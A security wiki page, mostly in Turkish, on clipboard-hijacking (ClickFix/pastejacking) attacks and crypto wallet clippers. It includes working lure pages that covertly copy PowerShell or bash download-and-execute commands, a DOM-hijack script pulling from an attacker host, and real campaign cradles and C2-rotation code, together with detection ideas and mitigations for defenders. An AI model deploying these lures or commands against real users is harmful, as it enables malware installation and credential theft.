# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – eski ama hâlâ geçerli bir tavsiye

## Overview

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden düzenli olarak kopyalayıp yapıştırması gerçeğini suistimal eder. Kötü niyetli bir web sayfası (veya Electron ya da Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir bağlam), saldırgan kontrolündeki metni programatik olarak sistem clipboard’una yerleştirir. Mağdurlar, genellikle dikkatle hazırlanmış sosyal engineering talimatlarıyla, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp clipboard içeriğini *yapıştırmaya* teşvik edilir; böylece rastgele komutlar hemen çalıştırılır.

**Hiç dosya indirilmediği ve ek açılmadığı** için bu teknik, ekleri, makroları veya doğrudan komut çalıştırmayı izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü aşar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## Wallet-address replacement clippers

Başka bir **clipboard hijacking** varyantı hiç komut yapıştırmaz: kurbanın bir **cryptocurrency wallet address** kopyalamasını bekler, ardından yapıştırmadan hemen önce bunu sessizce saldırgan kontrollü bir adresle değiştirir. Bu, uzun wallet formatlarına karşı özellikle etkilidir; çünkü kullanıcılar çoğu zaman yalnızca ilk/son karakterleri doğrular.

Yaygın gerçek dünya özellikleri:
- **Thin loader + nested payload**: görünür app/exe meşru bir trading veya "profit" aracı gibi görünür; gerçek clipper ise bundle içinde daha derinde gizlidir (örneğin iç içe bir Rust payload başlatan .NET loader).
- **Regex-driven replacement**: malware, `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi string’leri veya hatta genel **44 karakterli Solana-benzeri** string’leri eşleştirip bunları saldırgan wallet’larıyla yeniden yazar.
- **Wallet rotation at scale**: modern Windows örnekleri, tek bir statik adres yerine para birimi başına **binlerce** replacement wallet gömebilir; bu da her hırsızlıktan sonra wallet itibarının yanmasını azaltır.

### Windows clipper flow

Yaygın bir implementation, **`AddClipboardFormatListener`** ile kaydedilmiş gizli bir window’dur. Her clipboard güncellemesinde malware tipik olarak şunları çağırır:
- **`OpenClipboard`** → mevcut clipboard verisine erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string’ini saldırgan değerle değiştirir.

Clipper’larda sık görülen minimal hunting regex’ler:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kullanıcı düzeyinde persistence etki için yeterlidir. Gözlemlenen bir örüntü şudur:
- Payload’u **`%APPDATA%\silke\silke.exe`** konumuna kopyala
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup-folder LNK** oluştur

Detection fikirleri:
- Clipboard API’lerini sürekli çağırırken aynı zamanda `%APPDATA%` ve kullanıcı **Startup** klasörü altına yazan process’ler.
- Yeni LNK/executable oluşturulmasını takiben wallet-address clipboard rewrites.
- Birçok kullanılmayan dosya ile birlikte iç içe bir binary başlatan küçük bir launcher içeren archive’ler veya sahte yazılım paketleri.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS üzerinde bazı campaign’ler bir **`unlocker.command`** yardımcısı gönderir ve Gatekeeper uygulamanın hasarlı olduğunu veya kimliği doğrulanmamış bir developer’dan geldiğini söylerse kurbandan sağ tık → **Open** yapmasını ister. Script basitçe quarantine’i kaldırır ve yakındaki `.app`’i başlatır:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` and `KeepAlive` olan LaunchAgent

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise eşzamansız **Clipboard API** (`navigator.clipboard.writeText`) üzerine dayanıyor.

## The ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted ya da compromised bir siteyi ziyaret eder (örn. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript, clipboard’a Base64 ile kodlanmış bir PowerShell one-liner’ını sessizce kaydeden `unsecuredCopyToClipboard()` yardımcısını çağırır.
3. HTML talimatları kurbana şunu söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter’a basın.”*
4. `powershell.exe` çalışır, içinde meşru bir executable ile kötü amaçlı bir DLL bulunan bir archive indirir (klasik DLL sideloading).
5. Loader ek aşamaları decrypt eder, shellcode inject eder ve persistence kurar (örn. scheduled task) – sonuçta NetSupport RAT / Latrodectus / Lumma Stealer çalışır.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll` dosyasını arar.
* Kötü amaçlı DLL, API’leri **GetProcAddress** ile dinamik olarak çözer, iki binary’yi (`data_3.bin`, `data_4.bin`) **curl.exe** üzerinden indirir, bunları `"https://google.com/"` rolling XOR key kullanarak çözer, son shellcode’u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` konumuna unzip eder.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. **cscript.exe** içinde JScript downloader’ı çalıştırır
3. Bir MSI payload getirir → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### MSHTA ile Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** çağrısı, `PartyContinued.exe` dosyasını alan, `Boat.pst` (CAB) dosyasını çıkaran, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturan ve sonunda tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrate eden bir `.a3x` scripti çalıştıran gizli bir PowerShell scripti başlatır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmelerini tamamen atlar ve kurbanlara WSH üzerinden JavaScript alan ve çalıştıran, bunu kalıcı hale getiren ve C2’yi günlük olarak döndüren tek satırlık bir komutu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Sıradan incelemeyi atlatmak için çalışma zamanında ters çevrilen obfuske edilmiş URL.
- JavaScript, Startup LNK (WScript/CScript) aracılığıyla kendini kalıcı kılar ve C2’yi geçerli güne göre seçer – hızlı domain rotation sağlar.

Tarihe göre C2’leri döndürmek için kullanılan minimal JS parçası:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sonraki aşama genellikle kalıcılık oluşturan ve bir RAT (ör. PureHVNC) çeken bir loader dağıtır; çoğu zaman TLS’yi hardcoded bir certificate’a pinler ve trafiği chunk’lara böler.

Bu varyanta özgü detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içinde, `%TEMP%`/`%APPDATA%` altındaki bir JS path ile WScript/CScript çağıran LNK.
- Registry/RunMRU ve command-line telemetry içinde `.split('').reverse().join('')` veya `eval(a.responseText)`.
- Uzun command line’lar olmadan uzun scripts beslemek için, büyük stdin payload’larla tekrarlanan `powershell -NoProfile -NonInteractive -Command -`.
- Sonrasında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBins çalıştıran Scheduled Tasks, updater gibi görünen bir task/path altında (ör. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern’ine sahip, günlük dönen C2 hostnames ve URLs.
- Clipboard write events’i, ardından Win+R paste ve hemen sonrasında `powershell.exe` execution ile ilişkilendir.

Blue-teams, pastejacking abuse’ünü tespit etmek için clipboard, process-creation ve registry telemetry’yi birlikte kullanabilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** komutlarının geçmişini tutar – olağandışı Base64 / obfuscated girdilere bakın.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` ve `NewProcessName` şu set içindeyse: { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` veya suspicious 4688 event’ten hemen önceki temporary folders.
* EDR clipboard sensors (varsa) – `Clipboard Write` ile hemen ardından gelen yeni bir PowerShell process’ini ilişkilendirin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları clipboard’larından OS-specific commands kopyalayıp native consoles içine yapıştırmaya zorlayan sahte CDN/browser verification pages ("Just a moment…", IUAM-style) üretiyor. Bu, execution’ı browser sandbox dışına taşır ve Windows ile macOS genelinde çalışır.

Builder-generated pages’in temel özellikleri
- Payload’ları uyarlamak için `navigator.userAgent` üzerinden OS detection (Windows PowerShell/CMD vs. macOS Terminal). Desteklenmeyen OS’lar için isteğe bağlı decoy/no-op, illüzyonu korur.
- Görünen metin clipboard content’ten farklı olabilirken, masum UI actions (checkbox/Copy) sırasında otomatik clipboard-copy.
- Mobile blocking ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsiyonel obfuscation ve compromised site’ın DOM’unu Tailwind-styled bir verification UI ile overwrite eden single-file injector (yeni domain registration gerekmez).

Örnek: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS ilk çalıştırma kalıcılığı
- Terminal kapandıktan sonra da yürütmenin devam etmesi için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın; böylece görülebilir izler azalır.

Ele geçirilmiş sitelerde yerinde sayfa ele geçirme
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- IUAM tarzı lures için özel Detection & hunting fikirleri
- Web: Clipboard API’yi verification widgets’a bağlayan sayfalar; gösterilen metin ile clipboard payload arasında uyumsuzluk; `navigator.userAgent` branching; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: Bir browser etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` içinden yürütülen batch/MSI installers.
- macOS endpoint: Terminal/iTerm’in browser olaylarına yakın şekilde `bash`/`curl`/`base64 -d` ile `nohup` başlatması; terminal kapandıktan sonra da yaşayan background jobs.
- `RunMRU` Win+R geçmişini ve clipboard writes’ı sonraki console process creation ile correlate edin.

Ayrıca destekleyici teknikler için bkz.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini compromise etmeye ve loader JavaScript inject etmeye devam ediyor; bu script external hosts (Cloudflare Workers, GitHub/jsDelivr) zinciri kuruyor ve hatta blockchain “etherhiding” çağrıları (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API endpoints’ine POST’lar) kullanarak güncel lure logic’i çekiyor. Son overlay’ler, herhangi bir şey indirmek yerine kullanıcıya tek satırlık bir komutu kopyalayıp yapıştırmasını söyleyen sahte CAPTCHAs’ı yoğun şekilde kullanıyor (T1204.004).
- Initial execution giderek signed script hosts/LOLBAS’a devrediliyor. Ocak 2026 zincirleri, önceki `mshta` kullanımını, `WScript.exe` üzerinden çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` ile değiştirdi; remote content’i fetch etmek için aliases/wildcards içeren PowerShell-benzeri arguments geçiriyor:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ile birlikte ve alışılmadık argümanlarla (`gal`/`gcm` takma adları, wildcard’lı cmdlet’ler, jsDelivr URL’leri) eşleştirildiğinde ClearFake için yüksek sinyalli bir LOLBAS aşaması olur.
- Şubat 2026 sahte CAPTCHA payload’ları yeniden saf PowerShell download cradle’larına kaydı. İki canlı örnek:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir, bellek içi bir `iex(irm ...)` grabber; ikinci zincir `WinHttp.WinHttpRequest.5.1` üzerinden stage eder, geçici bir `.ps1` yazar ve ardından gizli bir pencerede `-ep bypass` ile başlatır.

Bu varyantlar için tespit/avlanma ipuçları
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya clipboard yazımlarından / Win+R’den hemen sonra PowerShell cradle’ları.
- Command-line anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domainleri veya raw IP `iex(irm ...)` kalıpları.
- Network: web gezintisinden kısa süre sonra script hosts/PowerShell üzerinden CDN worker hostlarına veya blockchain RPC endpoint’lerine giden outbound istekler.
- File/registry: `%TEMP%` altında geçici `.ps1` oluşturulması ve RunMRU girdilerinde bu one-liner’ların bulunması; harici URL’ler veya obfuscated alias strings ile çalışan signed-script LOLBAS (WScript/cscript/mshta) için block/alert.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Son Red Canary telemetry, sabit indicator’ın **tek bir tam komut** olmadığını, bunun yerine **kullanıcı destekli paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** ve **immediate execution** birleşimi olduğunu gösteriyor.

### Notable operator patterns

- **Paste confirmation telemetry**: bazı payload’lar gerçek stage’den önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` çağırır. Bu, kullanıcı etkileşimini doğrularken pencereyi kısa ve sessiz tutar.
- **Fake verification comments**: PowerShell one-liner’ları, komut Run / `cmd.exe` / PowerShell history içine yapıştırıldığında hâlâ CAPTCHA ile ilişkili görünmesi için `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi string’ler ekleyebilir.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` komut satırında statik bir URL olmadan in-memory download-and-execute yapmayı sürdürür.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` alışılmadık casing ve flag’lerde Unicode-benzeri karakterleri kötüye kullanarak kırılgan detections’ları bozar, ancak yine de `msiexec.exe` gibi görünür.
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escape’leriyle (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) anahtar kelimeleri gizleyebilir, nested shell’i küçültülmüş başlatabilir, attacker içeriğini `.pdf` gibi zararsız bir uzantıyla kaydedebilir ve ardından `mshta` üzerinden çalıştırabilir.
## Mitigations

1. Browser hardening – clipboard write-access’i (`dom.events.asyncClipboard.clipboardItem` vb.) devre dışı bırakın veya kullanıcı etkileşimi zorunlu kılın.
2. Security awareness – kullanıcılara hassas komutları *yazmalarını* veya önce bir text editor’e yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile keyfi one-liner’ları engelleyin.
4. Network controls – bilinen pastejacking ve malware C2 domainlerine giden outbound istekleri engelleyin.

## Related Tricks

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir server’a çektikten sonra aynı ClickFix yaklaşımını kötüye kullanır:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
